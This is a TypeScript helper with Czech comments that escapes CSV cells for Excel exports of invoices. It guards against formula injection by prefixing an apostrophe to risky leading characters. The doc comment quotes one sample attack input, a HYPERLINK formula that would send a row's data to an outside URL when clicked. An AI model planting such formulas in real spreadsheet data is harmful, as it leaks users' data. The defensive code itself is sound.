/**
 * Jedna buňka CSV pro Excel (oddělovač středník) — sdílí ji export pro
 * účetního (lib/ucetni-export.ts) i export faktur (app/api/faktury/export).
 *
 * Text, který začíná =, +, -, @, tabulátorem nebo CR, Excel spustí jako
 * VZOREC. Číslo faktury, dodavatel i předmět e-mailu přicházejí z příjmu
 * faktur od kohokoli, kdo pošle doklad do schránky (ISDOC <ID> se bere
 * doslova) — `=HYPERLINK("https://…?"&A2;"Doklad")` by po kliknutí poslal
 * data z řádku ven (kontrola 19. 10.). Takový text dostane úvodní
 * apostrof: Excel ho ukáže jako text.
 *
 * Čísla zůstávají čísly, i záporná (dobropis -500.00) — jinak by účetnímu
 * přestaly fungovat součty.
 *
 * Bez `server-only` a bez aliasů v importech — testuje ho Node
 * (scripts/ucetni-export.test.mjs).
 */
export function csvBunka(hodnota: string | number | null | undefined): string {
  let s = hodnota === null || hodnota === undefined ? '' : String(hodnota)
  if (/^[=+\-@\t\r]/.test(s) && !/^-?\d+([.,]\d+)?$/.test(s)) s = `'${s}`
  if (/[";\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`
  return s
}
